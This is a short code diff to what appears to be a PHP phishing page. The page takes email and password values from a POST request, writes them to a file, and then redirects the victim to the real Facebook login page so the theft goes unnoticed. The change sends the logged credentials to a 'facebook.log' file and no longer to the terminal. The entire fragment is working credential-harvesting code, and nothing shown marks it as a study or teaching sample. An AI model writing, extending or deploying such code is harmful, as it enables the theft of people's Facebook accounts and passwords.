@@ -17,7 +17,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         fclose($file);
 
         // Log the data to the terminal
-        error_log("Email: $email\nPassword: $password\n");
+        error_log("Email: $email\nPassword: $password\n", 3, "../logs/facebook.log");
 
         // Redirect to the real Facebook login page
         header("Location: https://facebook.com");
